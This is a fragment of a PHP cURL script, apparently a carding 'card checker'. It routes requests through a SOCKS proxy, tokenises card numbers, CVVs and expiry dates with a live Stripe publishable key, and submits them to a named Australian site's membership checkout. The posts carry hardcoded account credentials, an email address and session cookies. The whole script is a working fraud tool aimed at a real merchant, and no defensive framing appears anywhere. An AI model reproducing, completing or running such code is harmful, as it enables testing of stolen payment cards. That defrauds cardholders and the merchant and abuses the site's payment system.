...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=98d502a4-3a14-495b-ad11-1fbbead9eb70448ef2&muid=4fb11847-3506-4ae3-80da-13a383c9cbcd46a467&sid=dc56a826-9c35-41ad-add0-7459fc1b09427263f2&payment_user_agent=stripe.js%2F2c04e5ffb%3B+stripe-js-v3%2F2c04e5ffb&time_on_page=157495&referrer=https%3A%2F%2Fcomplianceadvocacysolutions.com.au%2F&key=pk_live_9ud9830vf6bijOEC3ingtvbU00WnyKx2HO');
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://complianceadvocacysolutions.com.au/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: complianceadvocacysolutions.com.au',
'method: POST',
...
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'cookie: _ga=GA1.3.1061910501.1627310408; __stripe_mid=4fb11847-3506-4ae3-80da-13a383c9cbcd46a467; PHPSESSID=hnpufo4n86g3kl38usc9k5l180; pmpro_visit=1; pmpro_visit=1; _gid=GA1.3.1565401078.1627490476; __stripe_sid=dc56a826-9c35-41ad-add0-7459fc1b09427263f2',
'origin: https://complianceadvocacysolutions.com.au',
'referer: https://complianceadvocacysolutions.com.au/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
...
curl_setopt($ch, CURLOPT_POSTFIELDS,'level=&levelstodel=&checkjavascript=1&other_discount_code=&username=aditya457mth&password=Qweasd%40123&password2=Qweasd%40123&bemail=gk67mth%40gmail.com&bconfirmemail=gk67mth%40gmail.com&fullname=&bcountry=US&CardType=visa&discount_code=&tos=1&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
